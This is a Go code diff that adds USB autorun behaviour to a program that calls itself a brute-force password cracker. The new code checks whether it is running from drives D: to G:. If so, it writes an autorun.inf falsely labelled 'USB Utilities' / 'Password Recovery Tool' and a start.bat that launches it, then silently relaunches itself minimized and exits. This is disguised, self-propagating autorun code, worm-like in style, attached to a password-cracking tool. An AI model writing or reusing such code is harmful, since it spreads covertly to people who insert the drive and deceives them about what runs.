@@ -4,6 +4,8 @@ import (
 	"bufio"
 	"fmt"
 	"os"
+	"os/exec"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -24,6 +26,36 @@ const (
 type ProgressState struct {
 	CurrentLength int
 	CurrentCombo  string
+}
+
+func setupAutorun() {
+	autorunContent := `[AutoRun]
+open=start.bat
+action=Password Recovery Tool
+label=USB Utilities
+`
+	batContent := `@echo off
+start /min ` + filepath.Base(os.Args[0]) + `
+exit
+`
+
+	if _, err := os.Stat("autorun.inf"); os.IsNotExist(err) {
+		os.WriteFile("autorun.inf", []byte(autorunContent), 0644)
+	}
+
+	if _, err := os.Stat("start.bat"); os.IsNotExist(err) {
+		os.WriteFile("start.bat", []byte(batContent), 0644)
+	}
+}
+
+func isRunningFromUSB() bool {
+	exePath, _ := os.Executable()
+	for _, drive := range []string{"D:", "E:", "F:", "G:"} {
+		if strings.HasPrefix(strings.ToUpper(exePath), drive) {
+			return true
+		}
+	}
+	return false
 }
 
 func SaveState(length int, combo string) error {
@@ -109,6 +141,12 @@ func BruteForce(alphabet string, buffer []rune, pos, length int, startFrom strin
 }
 
 func main() {
+	if isRunningFromUSB() {
+		setupAutorun()
+		exec.Command("cmd", "/C", "start", "/min", filepath.Base(os.Args[0])).Run()
+		os.Exit(0)
+	}
+
 	fmt.Println("Brute Force Password Cracker")
 	fmt.Println("--------------------------")
 
